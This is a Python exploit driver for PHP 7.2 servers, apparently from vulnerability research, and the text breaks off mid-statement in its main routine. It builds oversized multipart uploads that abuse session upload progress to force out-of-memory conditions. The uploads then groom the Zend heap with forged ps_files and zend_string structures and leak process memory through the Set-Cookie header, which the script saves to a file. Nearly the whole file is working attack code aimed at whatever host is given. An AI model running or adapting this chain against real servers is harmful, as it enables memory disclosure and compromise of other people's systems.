#!/usr/bin/env python3
"""PHP 7.2 chain driver: arm / fill / consumer steps on ONE keep-alive connection.

Every step of a pair must be served by the same prefork child, because the
stale ``ps_globals`` the chain relies on is per process. A keep-alive
connection is the portable way to guarantee that, and it works on a pool of
any width (Measured: one connection, both requests, same child, 5-worker
pool).

Usage examples (a local mirror on 127.0.0.1:7211):
  drive.py --port 7211 --plan state --nheaders 1299780
  drive.py --port 7211 --plan arm,get,get --nheaders 1299780
  drive.py --port 7211 --plan arm,fills --nheaders 1299780 --nfill 1000
  drive.py --port 7211 --plan "arm,chain9:614000:40:1:77:60000:0" \\
           --carlen 84000 --primlen 82000

Plan tokens: arm, get, post, fill:N, fills, cons, fillcheap:N,
chain:N..chain5, chain7..chain9, preseed, drain, arm2:.., arm3:..
``state`` is an alias used for the gdb probes. Body builders are imported by
``chain72.py`` and ``fullchain.py``; see ``docs/PHP72-CHAIN.md``.
"""
import argparse, json, socket, ssl, struct, sys, time

COOKIE_OUT = "cookie72.hex"      # Set-Cookie hex from an arm+chain9 pair

BND = "BND72"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36")
ALNUM = "abcdefghijklmnopqrstuvwxyz0123456789"


def uname(prefix, i, width):
    if width <= 1:
        return prefix[:width] or "x"
    d = []; x = i
    while len(d) < width - 1:
        d.append(ALNUM[x % len(ALNUM)]); x //= len(ALNUM)
    return (prefix + "".join(reversed(d)))[:width]


def part(name, value=b"", filename=None, headers=()):
    out = [b"--" + BND.encode() + b"\r\n",
           b'Content-Disposition: form-data; name="' + name.encode() + b'"']
    if filename is not None:
        out.append(b'; filename="' + filename.encode() + b'"')
        out.append(b"\r\nContent-Type: application/octet-stream")
    out.append(b"\r\n")
    for h in headers:
        out.append(h.encode() + b"\r\n")
    out.append(b"\r\n"); out.append(value); out.append(b"\r\n")
    return b"".join(out)


def filepart_head(name=b"f", filename=b"a.txt"):
    # NOTE: no trailing blank line -- the caller appends the header block and
    # then b"\r\n" to terminate it (byte-shape identical to pair8m.py).
    return (b"--" + BND.encode() + b"\r\n" +
            b'Content-Disposition: form-data; name="' + name + b'"; filename="' + filename + b'"' +
            b"\r\nContent-Type: application/octet-stream\r\n")


# ---------------- bodies ----------------
def arm_body(nheaders, hdr=b"a:\n", sid=b"\x00", filebody=b"A" * 4, tailhdr=0):
    extra = (b"z:" + b"x" * tailhdr + b"\n") if tailhdr else b""
    c = [part("PHPSESSID", sid), part("PHP_SESSION_UPLOAD_PROGRESS", b"pwn"),
         filepart_head() + hdr * nheaders + extra + b"\r\n" + filebody + b"\r\n",
         b"--" + BND.encode() + b"--\r\n"]
    return b"".join(c)


def arm2_body(nh1, nh2, sid=b"\x00", hdr=b"a:\n"):
    """Two file parts: the first part's header block ends `nh1` lines in, so its
    FILE_START event (session init) runs with headroom left; the second part's
    `nh2` header lines then consume the rest and trip the 160 MB limit."""
    return b"".join([
        part("PHPSESSID", sid), part("PHP_SESSION_UPLOAD_PROGRESS", b"pwn"),
        filepart_head(b"f", b"a.txt") + hdr * nh1 + b"\r\n" + b"AAAA" + b"\r\n",
        b"--" + BND.encode() + b"\r\n",
        filepart_head(b"g", b"b.txt") + hdr * nh2 + b"\r\n" + b"BBBB" + b"\r\n",
        b"--" + BND.encode() + b"--\r\n"])


def arm3_body(nh1, nh2, nh3, sid=b"\x00", hdr=b"a:\n"):
    """Three file parts. FILE_START of part k fires at the end of part k's header
    block, and each one re-runs php_session_initialize (so the id / ps_files /
    http_session_vars are re-created at the current fill position). The third
    block then trips the parser, so the *last* session init sits at the OOM
    boundary and the module teardown is skipped (parse runs before
    zend_activate_modules)."""
    bnd = b"--" + BND.encode() + b"\r\n"
    return b"".join([
        part("PHPSESSID", sid), part("PHP_SESSION_UPLOAD_PROGRESS", b"pwn"),
        filepart_head(b"f", b"a.txt") + hdr * nh1 + b"\r\n" + b"AAAA" + b"\r\n",
        bnd, filepart_head(b"g", b"b.txt") + hdr * nh2 + b"\r\n" + b"BBBB" + b"\r\n",
        bnd, filepart_head(b"h", b"c.txt") + hdr * nh3 + b"\r\n" + b"CCCC" + b"\r\n",
        b"--" + BND.encode() + b"--\r\n"])


def tail_fields():
    return (part("PHPSESSID", b"x") + part("PHP_SESSION_UPLOAD_PROGRESS", b"pwn") +
            b"--" + BND.encode() + b"--\r\n")


def tiny_consumer():
    """file part first (small), session fields at the end -> END-event init."""
    return (filepart_head() + b"X: a\r\n\r\n" + b"AAAA" + b"\r\n" + tail_fields())


def drain_posts():
    """plain POST with no session fields and no file part: parses, allocates little."""
    return (part("d", b"1") + b"--" + BND.encode() + b"--\r\n")


def payload_psfiles(n=3071):
    """3071-byte header value -> emalloc(3072) -> bin-3072 page, slot 0 page-aligned.
    ps_files{lastkey=NULL, basedir=NULL, basedir_len=0x180000(also ZSTR_LEN),
             dirdepth=garbage, st_size=garbage, filemode=0, fd=-1}"""
    b = bytearray(b"A" * n)
    b[0x00:0x10] = b"\x00" * 16
    b[0x10:0x18] = struct.pack("<Q", 0x180000)   # basedir_len / ZSTR_LEN
    b[0x18:0x20] = b"AAAAAAAA"                   # val[0] non-NUL
    b[0x28:0x2c] = struct.pack("<I", 0)          # filemode
    b[0x2c:0x30] = struct.pack("<I", 0xFFFFFFFF)  # fd = -1
    return bytes(b)


def fill_consumer(nfill, nvals=3071, name=b"a", tail=None, extra_headers=0):
    """One file part whose header block is nfill filler headers of nvals bytes
    (each -> one page), followed by the two payload headers, then the body and
    the session fields (so session init happens at the END event, after parse)."""
    head = filepart_head()
    hdr = b"a:" + b"F" * nvals + b"\n"
    p1 = b"a:" + payload_psfiles(nvals) + b"\n"   # page 510 shape (ps_files)
    p2 = b"a:" + payload_psfiles(nvals) + b"\n"   # page 511 shape (zend_string)
    if tail is None:
        tail = b""
    body = head + hdr * nfill + p1 + p2 + tail + b"\r\n" + b"AAAA" + b"\r\n"
    return body + tail_fields()


def filler_consumer(npage, nvals=3071):
    """Just fill with 1-page allocations, no payload."""
    head = filepart_head()
    hdr = b"a:" + b"F" * nvals + b"\n"
    return head + hdr * npage + b"\r\n" + b"AAAA" + b"\r\n" + tail_fields()


def fillcheap_body(nheaders, hdr=b"a:\n"):
    """One file part whose header block is nheaders cheap headers (each ~1/30 page),
    then the body and the session fields at the end (END-event session init)."""
    return (filepart_head() + hdr * nheaders + b"\r\n" + b"AAAA" + b"\r\n" + tail_fields())


def chain_body(ncheap, nvals=3071, hdr=b"a:\n"):
    """ncheap cheap fillers, then TWO dual-use payload headers (each value is
    nvals bytes -> exactly one fresh page, slot 0 page-aligned), then body and
    session fields."""
    pay = b"a:" + payload_psfiles(nvals) + b"\n"
    return (filepart_head() + hdr * ncheap + pay + pay +
            b"\r\n" + b"AAAA" + b"\r\n" + tail_fields())


def payload_2page(n=8191):
    """One 8191-byte header value -> emalloc(8192) -> LRUN(2) starting page-aligned.
    offset 0x000: ps_files{lastkey=NULL, basedir=NULL, basedir_len=0x180000,
                           dirdepth='A'*8, st_size='A'*8, filemode=0, fd=-1}
    offset 0x1000: zend_string{gc=0, h=0, len=0x180000, val='A'}
    """
    b = bytearray(b"A" * n)
    b[0x00:0x10] = b"\x00" * 16
    b[0x10:0x18] = struct.pack("<Q", 0x180000)
    b[0x18:0x20] = b"AAAAAAAA"
    b[0x28:0x2c] = struct.pack("<I", 0)
    b[0x2c:0x30] = struct.pack("<I", 0xFFFFFFFF)
    b[0x1000:0x1010] = b"\x00" * 16
    b[0x1010:0x1018] = struct.pack("<Q", 0x180000)
    b[0x1018:0x1020] = b"AAAAAAAA"
    return bytes(b)


def chain2_body(ncheap, ncarrier=0, car=16384, hdr=b"a:\n", nvals=8191):
    """cheap fill header block + ONE 2-page payload header, file body, then
    optional carriers (each hXXXX[0] with a car-byte value -> 16KiB value = 5-page
    LRUN + per-name HashTable), then the session fields (END-event init)."""
    pay = b"a:" + payload_2page(nvals) + b"\n"
    c = [filepart_head(), hdr * ncheap, pay, b"\r\n", b"AAAA", b"\r\n"]
    body = bytes.fromhex("00")
    if ncarrier:
        val = b"C" * car
        for i in range(ncarrier):
            c.append(part(uname("h", i, 4) + "[0]", val))
    c.append(tail_fields())
    return b"".join(c)


def carrier_payload(cblen, cb, ps_off=None, id_off=None, fill=b"C"):
    """Binary-safe form-field value: the zend_string content covers pages
    cb .. cb+len/4096.  If ps_off/id_off are given, plant the ps_files struct
    and the fake zend_string at those content offsets (which land exactly on
    page 510 / 511 of the stale chunk)."""
    b = bytearray(fill * cblen)
    if ps_off is not None:
        b[ps_off:ps_off + 0x10] = b"\x00" * 16
        b[ps_off + 0x10:ps_off + 0x18] = struct.pack("<Q", 0x180000)
        b[ps_off + 0x18:ps_off + 0x20] = b"AAAAAAAA"
        b[ps_off + 0x28:ps_off + 0x2c] = struct.pack("<I", 0)
        b[ps_off + 0x2c:ps_off + 0x30] = struct.pack("<I", 0xFFFFFFFF)
    if id_off is not None:
        b[id_off:id_off + 0x10] = b"\x00" * 16
        b[id_off + 0x10:id_off + 0x18] = struct.pack("<Q", 0x180000)
        b[id_off + 0x18:id_off + 0x20] = b"AAAAAAAA"
    return bytes(b)


def chain3_body(ncheap, ncarrier, carlen, cb=None, car2=16384, hdr=b"a:\n"):
    """cheap fill, then carriers.  The FIRST carrier is `pz` and carries the
    payload at page cb (if given); the rest are `hXXXX[0]` fillers that populate
    the leak window after page 511."""
    c = [filepart_head(), hdr * ncheap, b"\r\n", b"AAAA", b"\r\n"]
    ps_off = id_off = None
    if cb is not None:
        ps_off = (510 - cb) * 4096 - 0x18
        id_off = (511 - cb) * 4096 - 0x18
    c.append(part("pz", carrier_payload(carlen, cb, ps_off, id_off)))
    for i in range(ncarrier):
        c.append(part(uname("h", i, 4) + "[0]", b"C" * car2))
    c.append(tail_fields())
    return b"".join(c)


def payload_window(T, L, fill=b"Z", hdr=0x18):
    """Value of length L that will become a zend_string block of exactly T pages.
    Fill it with the dual-use payload for EVERY candidate block-start page S in
    [512-T, 509], so whichever page the block really starts on, page 510 carries
    ps_files{lastkey=NULL,basedir=NULL,fd=-1} and page 511 carries
    zend_string{gc=0,len=0x180000,val='A'}."""
    b = bytearray(fill * L)
    for S in range(max(0, 512 - T), 510):
        for pg, kind in ((510, "ps"), (511, "id")):
            off = (pg - S) * 4096 - hdr
            if off < 0 or off + 0x30 > L:
                continue
            b[off:off + 0x10] = b"\x00" * 16
            b[off + 0x10:off + 0x18] = struct.pack("<Q", 0x180000)
            b[off + 0x18:off + 0x20] = b"AAAAAAAA"
            if kind == "ps":
                b[off + 0x28:off + 0x2c] = struct.pack("<I", 0)
                b[off + 0x2c:off + 0x30] = struct.pack("<I", 0xFFFFFFFF)
    return bytes(b)


def chain4_body(ncheap, carlen, primlen, hdr=b"a:\n", T=None):
    """file part: one big header (grows the multipart line buffer so the later
    payload value needs no new buffer), then ncheap cheap headers, then the body.
    Then the payload carrier part and the session fields."""
    if T is None:
        T = (carlen + 25 + 4095) // 4096
    c = [filepart_head(),
         b"a:" + b"H" * primlen + b"\n" if primlen else b"",
         hdr * ncheap,
         b"\r\n", b"AAAA", b"\r\n"]
    c.append(part("a", payload_window(T, carlen)))
    c.append(tail_fields())
    return b"".join(c)


def chain5_body(na, k, nb, carlen, primlen, car2=16384, hdr=b"a:\n"):
    """Split flood: part A (na cheap headers) fills the chunks above the one that
    will hold the carriers; K nested-name carriers then allocate HashTables +
    values inside that chunk (which becomes the leak window); part B (nb cheap
    headers) fills the rest and the stale chunk's tail; then the exact-fit
    payload carrier and the session fields."""
    T = (carlen + 25 + 4095) // 4096
    c = [filepart_head(), b"a:" + b"H" * primlen + b"\n", hdr * na,
         b"\r\n", b"AAAA", b"\r\n"]
    val = b"V" * car2
    for i in range(k):
        c.append(part(uname("h", i, 4) + "[0]", val))
    c.append(filepart_head(name=b"g"))
    c.extend([hdr * nb, b"\r\n", b"BBBB", b"\r\n"])
    c.append(part("a", payload_window(T, carlen)))
    c.append(tail_fields())
    return b"".join(c)


def preseed_body(nheaders, hdr=b"a:\n"):
    """A file-part flood with NO session fields: fills/caches chunks without
    touching session state (ends in an OOM during parse, leaves ~40 cached)."""
    return (filepart_head() + hdr * nheaders + b"\r\n" + b"AAAA" + b"\r\n" +
            b"--" + BND.encode() + b"--\r\n")


def chain7_body(na, nb, carlen, primlen, hdr=b"a:\n", hdr2=None):
    """Two flood segments with DISJOINT bin footprints: segment A uses 3-byte
    `a:\n` headers (bin-8 keys / bin-80 values / bin-40 llist), segment B uses
    5-byte keys and 250-byte values (bin-16 keys / bin-256 values).  Tests
    whether the second segment allocates fresh pages or reuses A's freed slots."""
    if hdr2 is None:
        hdr2 = b"bbbb:" + b"x" * 250 + b"\n"
    T = (carlen + 25 + 4095) // 4096
    c = [filepart_head(), b"a:" + b"H" * primlen + b"\n", hdr * na,
         b"\r\n", b"AAAA", b"\r\n"]
    c.append(filepart_head(name=b"g"))
    c.extend([hdr2 * nb, b"\r\n", b"BBBB", b"\r\n"])
    c.append(part("a", payload_window(T, carlen)))
    c.append(tail_fields())
    return b"".join(c)


def chain8_body(na, k, nb, carlen, primlen, car2=16384, hdr=b"a:\n", hdr2=None):
    """A: cheap flood (bin-8 keys/bin-80 values) | carriers (HashTables into the
    chunk being filled) | B: flood with DISJOINT bins (bin-16 keys / bin-48
    values) so it allocates fresh pages instead of reusing A's freed slots |
    payload (exact fit) | session fields."""
    if hdr2 is None:
        hdr2 = b"kkkkkkkkk:" + b"y" * 40 + b"\n"
    T = (carlen + 25 + 4095) // 4096
    c = [filepart_head(), b"a:" + b"H" * primlen + b"\n", hdr * na,
         b"\r\n", b"AAAA", b"\r\n"]
    val = b"V" * car2
    for i in range(k):
        c.append(part(uname("h", i, 4) + "[0]", val))
    c.append(filepart_head(name=b"g"))
    c.extend([hdr2 * nb, b"\r\n", b"BBBB", b"\r\n"])
    c.append(part("a", payload_window(T, carlen)))
    c.append(tail_fields())
    return b"".join(c)


def predrain_part(i, depth, val=b"p"):
    """One form field whose name is `qNNNN[j][j]...` with `depth` array levels.
    Each level creates a HashTable (emalloc 56 -> bin-56), so this part burns
    `depth` bin-56 slots with a minimal wire/page footprint."""
    name = ("q%04d" % i) + "".join("[%d]" % j for j in range(depth))
    return part(name, val)


def chain9_body(na, npred, depth, k, nb, carlen, primlen, car2=16384,
                hdr=b"a:\n", hdr2=None, payhdr=0x18):
    """chain8 plus a pre-drain segment: `npred` nested-name parts (each `depth`
    HashTables) between flood A and the carriers, so the bin-56 (HashTable) page
    boundary is crossed later in the carrier sequence -- i.e. while the fill is
    in the +2 MiB neighbour (the leak window) instead of the stale chunk."""
    if hdr2 is None:
        hdr2 = b"kkkkkkkkk:" + b"y" * 40 + b"\n"
    T = (carlen + 25 + 4095) // 4096
    c = [filepart_head(), b"a:" + b"H" * primlen + b"\n", hdr * na,
         b"\r\n", b"AAAA", b"\r\n"]
    for i in range(npred):
        c.append(predrain_part(i, depth))
    val = b"V" * car2
    for i in range(k):
        c.append(part(uname("h", i, 4) + "[0]", val))
    c.append(filepart_head(name=b"g"))
    c.extend([hdr2 * nb, b"\r\n", b"BBBB", b"\r\n"])
    c.append(part("a", payload_window(T, carlen, hdr=payhdr)))
    c.append(tail_fields())
    return b"".join(c)


# ---------------- transport ----------------
class Conn:
    def __init__(self, host, port, tls, timeout=300):
        self.host = host; self.port = port; self.timeout = timeout
        if tls:
            ctx = ssl.create_default_context(); ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            self.s = ctx.wrap_socket(socket.create_connection((host, port), timeout),
                                     server_hostname=host)
        else:
            self.s = socket.create_connection((host, port), timeout)
        self.s.settimeout(timeout); self.closed = False; self.buf = b""

    def close(self):
        try: self.s.close()
        except Exception: pass

    def _recv(self, n):
        if self.buf:
            d = self.buf; self.buf = b""; return d
        try: return self.s.recv(n)
        except OSError: return b""

    def get(self, path="/index.php"):
        req = ("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\n\r\n"
               % (path, self.host, UA)).encode()
        t0 = time.time(); self.s.sendall(req)
        return self._read_response(t0, 65536)

    def post(self, path, body, chunked=False, maxread=1 << 20):
        head = ["POST %s HTTP/1.1" % path, "Host: %s" % self.host,
                "Content-Type: multipart/form-data; boundary=" + BND,
                "User-Agent: " + UA, "Connection: keep-alive"]
        head.append("Transfer-Encoding: chunked" if chunked else "Content-Length: %d" % len(body))
        if chunked:
            head.append("Expect: 100-continue")
        t0 = time.time()
        try:
            self.s.sendall(("\r\n".join(head) + "\r\n\r\n").encode())
            if chunked:
                for off in range(0, len(body), 65536):
                    d = body[off:off+65536]
                    self.s.sendall(("%x\r\n" % len(d)).encode() + d + b"\r\n")
                self.s.sendall(b"0\r\n\r\n")
            else:
                self.s.sendall(body)
        except OSError:
            self.closed = True
        return self._read_response(t0, maxread)

    def _read_response(self, t0, maxread):
        head_buf = b""
        while b"\r\n\r\n" not in head_buf:
            d = self._recv(65536)
            if not d:
                self.closed = True; break
            head_buf += d
        ttfb = time.time() - t0
        raw, _, rest = head_buf.partition(b"\r\n\r\n")
        lines = raw.split(b"\r\n")
        status = lines[0].decode("latin-1", "replace") if lines and lines[0] else "(none)"
        hdrs = {}
        for ln in lines[1:]:
            if b":" in ln:
                k, v = ln.split(b":", 1)
                hdrs[k.strip().lower().decode("latin-1")] = v.strip().decode("latin-1")
        body = rest
        cl = hdrs.get("content-length")
        if cl is not None and "chunked" not in hdrs.get("transfer-encoding", ""):
            need = int(cl)
            while len(body) < need and not self.closed:
                d = self._recv(65536)
                if not d:
                    self.closed = True; break
                body += d
            body = body[:need]
        else:
            while not self.closed and len(body) < maxread:
                d = self._recv(65536)
                if not d:
                    self.closed = True; break
                body += d
                if b"0\r\n\r\n" in body[-8:] or b"PEAKI=" in body:
                    break
        return {"status": status, "ttfb": round(ttfb, 3), "total": len(body),
                "body": body[:600], "headers": hdrs, "closed": self.closed}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=7212)
    ap.add_argument("--tls", action="store_true")
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--plan", default="state")
    ap.add_argument("--nheaders", type=int, default=1299780)
    ap.add_argument("--sid", default="00")
    ap.add_argument("--hdr", default="a:\\n")
    ap.add_argument("--gap", type=float, default=0.15)
    ap.add_argument("--nfill", type=int, default=1000)
    ap.add_argument("--nvals", type=int, default=3071)
    ap.add_argument("--ndrain", type=int, default=0)
    ap.add_argument("--ncarrier", type=int, default=0)
    ap.add_argument("--carlen", type=int, default=37120)
    ap.add_argument("--cb", type=int, default=-1)
    ap.add_argument("--primlen", type=int, default=0)
    ap.add_argument("--armtail", type=int, default=0)
    ap.add_argument("--chunked", action="store_true")
    ap.add_argument("--wirecap", type=int, default=8388608)
    ap.add_argument("--json", default="")
    a = ap.parse_args()

    hdr = a.hdr.encode().decode("unicode_escape").encode("latin-1")
    out = {"plan": a.plan, "nheaders": a.nheaders}
    c = Conn(a.host, a.port, a.tls)
    steps = [s.strip() for s in a.plan.split(",") if s.strip()]
    try:
        for st in steps:
            if st == "arm":
                body = arm_body(a.nheaders, hdr, bytes.fromhex(a.sid), tailhdr=a.armtail)
                out["arm_wire"] = len(body)
                if len(body) > a.wirecap:
                    out["error"] = "arm over wirecap"; break
                out["t_arm"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
                r = c.post(a.path, body, a.chunked, maxread=65536)
                out["arm"] = {"status": r["status"], "ttfb": r["ttfb"], "total": r["total"],
                              "body": r["body"][:300].decode("latin-1", "replace"),
                              "set_cookie_len": len(r["headers"].get("set-cookie", "")),
                              "closed": r["closed"]}
            elif st == "get":
                r = c.get(a.path)
                out.setdefault("gets", []).append({"status": r["status"], "ttfb": r["ttfb"],
                                                   "closed": r["closed"]})
            elif st == "post":
                body = drain_posts()
                r = c.post(a.path, body, a.chunked, maxread=4096)
                out.setdefault("posts", []).append({"status": r["status"], "ttfb": r["ttfb"],
                                                    "closed": r["closed"]})
            elif st.startswith("fill:"):
                n = int(st.split(":", 1)[1])
                body = filler_consumer(n, a.nvals)
                out["fill_wire"] = len(body)
                if len(body) > a.wirecap:
                    out["fill_error"] = "fill over wirecap (%d)" % len(body); break
                out["t_fill"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
                r = c.post(a.path, body, a.chunked, maxread=1 << 20)
                out["fill"] = {"n": n, "status": r["status"], "ttfb": r["ttfb"],
                               "total": r["total"],
                               "body": r["body"][:200].decode("latin-1", "replace"),
                               "set_cookie_len": len(r["headers"].get("set-cookie", "")),
                               "closed": r["closed"]}
            elif st == "fills":
                body = fill_consumer(a.nfill, a.nvals)
                out["fills_wire"] = len(body)
                if len(body) > a.wirecap:
                    out["error"] = "fills over wirecap"; break
                out["t_fills"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
                r = c.post(a.path, body, a.chunked, maxread=1 << 20)
                out["fills"] = {"status": r["status"], "ttfb": r["ttfb"], "total": r["total"],
                                "body": r["body"][:400].decode("latin-1", "replace"),
                                "set_cookie_len": len(r["headers"].get("set-cookie", "")),
                                "closed": r["closed"]}
            elif st == "cons":
                body = tiny_consumer()
                out["cons_wire"] = len(body)
                out["t_cons"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
                r = c.post(a.path, body, a.chunked, maxread=1 << 20)
                sc = r["headers"].get("set-cookie", "")
                out["cons"] = {"status": r["status"], "ttfb": r["ttfb"], "total": r["total"],
                               "body": r["body"][:400].decode("latin-1", "replace"),
                               "set_cookie_len": len(sc), "closed": r["closed"]}
                out["set_cookie_head"] = sc[:100]
                open(COOKIE_OUT, "w").write(("Set-Cookie: " + sc).encode().hex())
            elif st.startswith("fillcheap:"):
                n = int(st.split(":", 1)[1])
                body = fillcheap_body(n)
                out["fillcheap_wire"] = len(body)
                if len(body) > a.wirecap:
                    out["fillcheap_error"] = "over wirecap %d" % len(body); break
                out["t_fillcheap"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
                r = c.post(a.path, body, a.chunked, maxread=1 << 20)
                out["fillcheap"] = {"n": n, "status": r["status"], "ttfb": r["ttfb"],
                                    "total": r["total"],
                                    "body": r["body"][:300].decode("latin-1", "replace"),
                                    "set_cookie_len": len(r["headers"].get("set-cookie", "")),
                                    "closed": r["closed"]}
            elif st.startswith("chain:"):
                n = int(st.split(":", 1)[1])
                body = chain_body(n, a.nvals)
                out["chain_wire"] = len(body)
                if len(body) > a.wirecap:
                    out["chain_error"] = "over wirecap %d" % len(body); break
                out["t_chain"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
                r = c.post(a.path, body, a.chunked, maxread=1 << 20)
                sc = r["headers"].get("set-cookie", "")
                out["chain"] = {"n": n, "status": r["status"], "ttfb": r["ttfb"],
                                "total": r["total"],
                                "body": r["body"][:300].decode("latin-1", "replace"),
                                "set_cookie_len": len(sc), "closed": r["closed"]}
                out["set_cookie_head"] = sc[:100]
                open(COOKIE_OUT, "w").write(("Set-Cookie: " + sc).encode().hex())
            elif st.startswith("chain2:"):
                n = int(st.split(":", 1)[1])
                body = chain2_body(n, a.ncarrier)
                out["chain2_wire"] = len(body)
                if len(body) > a.wirecap:
                    out["chain2_error"] = "over wirecap %d" % len(body); break
                out["t_chain2"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
                r = c.post(a.path, body, a.chunked, maxread=4 << 20)
                sc = r["headers"].get("set-cookie", "")
                out["chain2"] = {"n": n, "status": r["status"], "ttfb": r["ttfb"],
                                 "total": r["total"],
                                 "body": r["body"][:300].decode("latin-1", "replace"),
                                 "set_cookie_len": len(sc), "closed": r["closed"]}
                out["set_cookie_head"] = sc[:100]
                open(COOKIE_OUT, "w").write(("Set-Cookie: " + sc).encode().hex())
            elif st.startswith("chain3:"):
                n = int(st.split(":", 1)[1])
                cb = a.cb if a.cb >= 0 else None
                body = chain3_body(n, a.ncarrier, a.carlen, cb)
                out["chain3_wire"] = len(body)
                if len(body) > a.wirecap:
                    out["chain3_error"] = "over wirecap %d" % len(body); break
                out["t_chain3"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
                r = c.post(a.path, body, a.chunked, maxread=4 << 20)
                sc = r["headers"].get("set-cookie", "")
                out["chain3"] = {"n": n, "status": r["status"], "ttfb": r["ttfb"],
                                 "total": r["total"],
                                 "body": r["body"][:300].decode("latin-1", "replace"),
                                 "set_cookie_len": len(sc), "closed": r["closed"]}
                out["set_cookie_head"] = sc[:100]
                open(COOKIE_OUT, "w").write(("Set-Cookie: " + sc).encode().hex())
            elif st.startswith("chain4:"):
                n = int(st.split(":", 1)[1])
                body = chain4_body(n, a.carlen, a.primlen)
                out["chain4_wire"] = len(body)
                if len(body) > a.wirecap:
                    out["chain4_error"] = "over wirecap %d" % len(body); break
                out["t_chain4"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
                r = c.post(a.path, body, a.chunked, maxread=4 << 20)
                sc = r["headers"].get("set-cookie", "")
                out["chain4"] = {"n": n, "status": r["status"], "ttfb": r["ttfb"],
                                 "total": r["total"],
                                 "body": r["body"][:300].decode("latin-1", "replace"),
                                 "set_cookie_len": len(sc), "closed": r["closed"]}
                out["set_cookie_head"] = sc[:100]
                open(COOKIE_OUT, "w").write(("Set-Cookie: " + sc).encode().hex())
            elif st.startswith("chain5:"):
                spec = st.split(":", 1)[1]
                na, k, nb = [int(x) for x in spec.split(":")]
                body = chain5_body(na, k, nb, a.carlen, a.primlen)
                out["chain5_wire"] = len(body)
                if len(body) > a.wirecap:
                    out["chain5_error"] = "over wirecap %d" % len(body); break
                out["t_chain5"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
                r = c.post(a.path, body, a.chunked, maxread=8 << 20)
                sc = r["headers"].get("set-cookie", "")
                out["chain5"] = {"na": na, "k": k, "nb": nb, "status": r["status"],
                                 "ttfb": r["ttfb"], "total": r["total"],
                                 "body": r["body"][:300].decode("latin-1", "replace"),
                                 "set_cookie_len": len(sc), "closed": r["closed"]}
                open(COOKIE_OUT, "w").write(("Set-Cookie: " + sc).encode().hex())
            elif st.startswith("preseed"):
                n = a.nheaders if ":" not in st else int(st.split(":", 1)[1])
                body = preseed_body(n)
                out["preseed_wire"] = len(body)
                r = c.post(a.path, body, a.chunked, maxread=65536)
                out["preseed"] = {"status": r["status"], "ttfb": r["ttfb"],
                                  "body": r["body"][:200].decode("latin-1", "replace"),
                                  "closed": r["closed"]}
            elif st.startswith("chain7:"):
                na, nb = [int(x) for x in st.split(":", 1)[1].split(":")]
                body = chain7_body(na, nb, a.carlen, a.primlen)
                out["chain7_wire"] = len(body)
                if len(body) > a.wirecap:
                    out["chain7_error"] = "over wirecap %d" % len(body); break
                out["t_chain7"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
                r = c.post(a.path, body, a.chunked, maxread=8 << 20)
                sc = r["headers"].get("set-cookie", "")
                out["chain7"] = {"na": na, "nb": nb, "status": r["status"],
                                 "ttfb": r["ttfb"], "total": r["total"],
                                 "body": r["body"][:300].decode("latin-1", "replace"),
                                 "set_cookie_len": len(sc), "closed": r["closed"]}
                open(COOKIE_OUT, "w").write(("Set-Cookie: " + sc).encode().hex())
            elif st.startswith("chain8:"):
                na, k, nb = [int(x) for x in st.split(":")[1:]]
                body = chain8_body(na, k, nb, a.carlen, a.primlen)
                out["chain8_wire"] = len(body)
                if len(body) > a.wirecap:
                    out["chain8_error"] = "over wirecap %d" % len(body); break
                out["t_chain8"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
                r = c.post(a.path, body, a.chunked, maxread=8 << 20)
                sc = r["headers"].get("set-cookie", "")
                out["chain8"] = {"na": na, "k": k, "nb": nb, "status": r["status"],
                                 "ttfb": r["ttfb"], "total": r["total"],
                                 "body": r["body"][:300].decode("latin-1", "replace"),
                                 "set_cookie_len": len(sc), "closed": r["closed"]}
                open(COOKIE_OUT, "w").write(("Set-Cookie: " + sc).encode().hex())
            elif st.startswith("arm3:"):
                nh1, nh2, nh3 = [int(x) for x in st.split(":")[1:]]
                body = arm3_body(nh1, nh2, nh3, bytes.fromhex(a.sid))
                out["arm3_wire"] = len(body)
                if len(body) > a.wirecap:
                    out["arm3_error"] = "over wirecap %d" % len(body); break
                r = c.post(a.path, body, a.chunked, maxread=65536)
                out["arm3"] = {"nh1": nh1, "nh2": nh2, "nh3": nh3, "status": r["status"],
                               "ttfb": r["ttfb"], "total": r["total"],
                               "body": r["body"][:300].decode("latin-1", "replace"),
                               "set_cookie_len": len(r["headers"].get("set-cookie", "")),
                               "closed": r["closed"]}
            elif st.startswith("arm2:"):
                nh1, nh2 = [int(x) for x in st.split(":")[1:]]
                body = arm2_body(nh1, nh2, bytes.fromhex(a.sid))
                out["arm2_wire"] = len(body)
                if len(body) > a.wirecap:
                    out["arm2_error"] = "over wirecap %d" % len(body); break
                r = c.post(a.path, body, a.chunked, maxread=65536)
                out["arm2"] = {"nh1": nh1, "nh2": nh2, "status": r["status"],
                               "ttfb": r["ttfb"], "total": r["total"],
                               "body": r["body"][:300].decode("latin-1", "replace"),
                               "set_cookie_len": len(r["headers"].get("set-cookie", "")),
                               "closed": r["closed"]}
            elif st.startswith("chain9:"):
                f = [int(x) for x in st.split(":")[1:]]
                na, npred, depth, k, nb = f[:5]
                payhdr = f[5] if len(f) > 5 else 0x18
                body = chain9_body(na, npred, depth, k, nb, a.carlen, a.primlen,
                                   payhdr=payhdr)
                out["chain9_wire"] = len(body)
                if len(body) > a.wirecap:
